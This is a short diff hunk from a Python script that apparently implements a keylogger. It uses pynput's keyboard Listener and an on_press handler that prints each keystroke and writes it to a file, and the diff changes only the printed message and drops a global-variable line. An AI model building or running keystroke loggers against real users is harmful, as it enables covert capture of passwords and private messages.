@@ -5,9 +5,9 @@ from pynput.keyboard import Key, Listener
 
 #Every time the key gets pressed
 def on_press(key):
-    global keys, count
     
-    print("{0} pressed".format(key))
+    
+    print("{0} key was pressed".format(key))
     write_file(key)
    
 #breaks out of the loop 
